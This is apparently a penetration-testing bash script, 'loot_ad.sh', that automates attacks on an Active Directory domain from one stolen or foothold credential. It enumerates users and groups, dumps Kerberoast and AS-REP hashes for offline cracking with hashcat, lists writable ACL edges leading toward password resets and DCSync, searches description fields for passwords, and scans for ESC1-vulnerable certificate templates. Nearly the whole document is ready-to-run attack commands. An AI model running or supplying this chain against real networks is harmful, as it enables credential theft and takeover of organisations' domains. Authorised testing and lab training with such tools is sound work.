#!/usr/bin/env bash
# loot_ad.sh — one-shot AD recon from a foothold credential, with a note after each
# result explaining what you use it for.
#
# Usage:
#   bash loot_ad.sh <DC_IP> <user> <pass> [domain] [CA_host]
#
# Example:
#   bash loot_ad.sh 172.16.10.11 jwheeler 'TheOwlsAreNotWhatTheySeem' \
#        greatnorthern.local 172.16.10.12
#
# Everything it finds gets written to ./loot/ so you can cat it into your report.

set -u

DCIP="${1:-}"; USER="${2:-}"; PASS="${3:-}"
DOMAIN="${4:-greatnorthern.local}"
CAHOST="${5:-}"

if [ -z "$DCIP" ] || [ -z "$USER" ] || [ -z "$PASS" ]; then
  echo "usage: bash loot_ad.sh <DC_IP> <user> <pass> [domain] [CA_host]"
  exit 1
fi

mkdir -p loot
step() { echo; echo "=============================================================="; echo "== $*"; echo "=============================================================="; }

step "0. clock and DNS (kerberos dies on skew, this costs people a night)"
date
cat /etc/resolv.conf | grep -i nameserver
echo "-> if the clock is off: sudo ntpdate $DCIP"

step "1. can we authenticate, and what is the host"
nxc smb "$DCIP" -u "$USER" -p "$PASS" | tee loot/01_smb.txt
echo "-> gives DC hostname, OS build, SMB signing. If signing is enforced, no relay tricks."

step "2. users and groups (flat data, no relationships)"
nxc ldap "$DCIP" -u "$USER" -p "$PASS" -d "$DOMAIN" --users | tee loot/02_users.txt
nxc ldap "$DCIP" -u "$USER" -p "$PASS" -d "$DOMAIN" --groups | tee loot/03_groups.txt
echo "-> look for: accounts with SPNs, accounts with no preauth, anything named svc*/admin*."

step "3. roastable accounts"
nxc ldap "$DCIP" -u "$USER" -p "$PASS" -d "$DOMAIN" --kerberoasting loot/kerb.txt
echo "-> saved loot/kerb.txt (TGS hashes). Crack offline: hashcat -m 13100 loot/kerb.txt rockyou.txt"
nxc ldap "$DCIP" -u "$USER" -p "$PASS" -d "$DOMAIN" --asreproast loot/asrep.txt
echo "-> saved loot/asrep.txt (no preauth = no creds needed to request). -m 18200 to crack."

step "4. what can this account write to (the ACL road)"
bloodyad -u "$USER" -p "$PASS" -d "$DOMAIN" --host "$DCIP" get writable | tee loot/04_writable.txt
echo "-> GENERIC_ALL / WRITE_DACL / WRITE_OWNER / CREATE_CHILD / ForceChangePassword edges."
echo "-> any of those on a user = try a password reset. On the domain object = DCSync is next."

step "5. description fields often hold passwords"
nxc ldap "$DCIP" -u "$USER" -p "$PASS" -d "$DOMAIN" --query "(objectClass=user)" description \
  | tee loot/05_descriptions.txt
echo "-> check anything that looks like a password in a description field."

if [ -n "$CAHOST" ]; then
  step "6. ADCS: look for a template you can request as someone else (ESC1)"
  certipy-ad find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DCIP" -target "$CAHOST" \
    -vulnerable -stdout | tee loot/06_adcs.txt
  echo "-> needs CA name + template name + enrolment rights. -target must be the CA, not the DC."
else
  echo
  echo "[i] no CA host given, skipping ADCS. Re-run with the CA IP to include it."
fi

step "done"
ls -la loot
echo
echo "Cracking reminders:"
echo "  hashcat -m 13100 loot/kerb.txt /usr/share/wordlists/rockyou.txt --show    # TGS (ticket)"
echo "  hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt --show   # AS-REP"
echo "  a \$krb5tgs\$ hash CANNOT be passed. Only an NTLM hash works with -hashes."
